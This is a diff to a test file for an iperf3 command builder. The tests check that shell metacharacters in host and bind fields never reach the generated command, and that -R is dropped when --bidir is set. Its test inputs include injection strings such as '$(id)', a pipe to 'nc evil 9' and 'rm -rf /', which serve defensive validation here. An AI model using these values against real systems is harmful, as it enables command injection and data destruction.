@@ -2,6 +2,7 @@ import assert from "node:assert";
 import {
   DEFAULT_IPERF3_OPTIONS,
   buildIperf3Command,
+  buildIperf3Parts,
   parseIperf3Summary,
   type Iperf3Options,
 } from "../../client/src/lib/toolkit/iperf3-command-builder.ts";
@@ -190,6 +191,43 @@ assert.strictEqual(
 
 // V9. Adversarial bind is rejected (shell metacharacters never reach the string).
 assert.strictEqual(buildIperf3Command(opts({ host: "h", bind: "1.2.3.4; rm -rf /" })), "iperf3 -c h");
+
+// The server field is pasted into a terminal, so anything a shell would act on is replaced by a placeholder.
+for (const hostile of [
+  "server.example; touch /tmp/x",
+  "h && id",
+  "h | nc evil 9",
+  "$(id)",
+  "`id`",
+  "h'",
+  'h"',
+  "a b",
+  "h\nid",
+  "h>out",
+  "h#c",
+  "h\\x",
+  "h*",
+]) {
+  assert.strictEqual(buildIperf3Command(opts({ host: hostile })), "iperf3 -c HOST", `host ${JSON.stringify(hostile)}`);
+}
+{
+  const parts = buildIperf3Parts(opts({ host: "x; y" }));
+  assert.match(parts.flags[0].explanation, /not part of a host name or address/);
+}
+// Names and addresses that are valid still go through untouched.
+for (const good of ["iperf.example.com", "10.0.0.1", "fe80::1%eth0", "2001:db8::1", "my-host_1.lan", "A.B-c.d"]) {
+  assert.strictEqual(buildIperf3Command(opts({ host: good })), `iperf3 -c ${good}`, `host ${good}`);
+}
+
+// iperf3 refuses -R with --bidir, so the pair never reaches the command; bidirectional stays.
+assert.strictEqual(buildIperf3Command(opts({ host: "h", reverse: true, bidir: true })), "iperf3 -c h --bidir");
+assert.strictEqual(buildIperf3Command(opts({ host: "h", reverse: true })), "iperf3 -c h -R");
+assert.strictEqual(buildIperf3Command(opts({ host: "h", bidir: true })), "iperf3 -c h --bidir");
+{
+  const both = buildIperf3Parts(opts({ host: "h", reverse: true, bidir: true }));
+  assert.ok(!both.parts.includes("-R"), "-R is not emitted with --bidir");
+  assert.match(both.flags.find((f) => f.flag === "--bidir")!.explanation, /-R is left out/);
+}
 
 // V10. Adversarial / unicode / huge input does not throw and yields no rows.
 assert.strictEqual(parseIperf3Summary("   \t  \n\n").rows.length, 0);
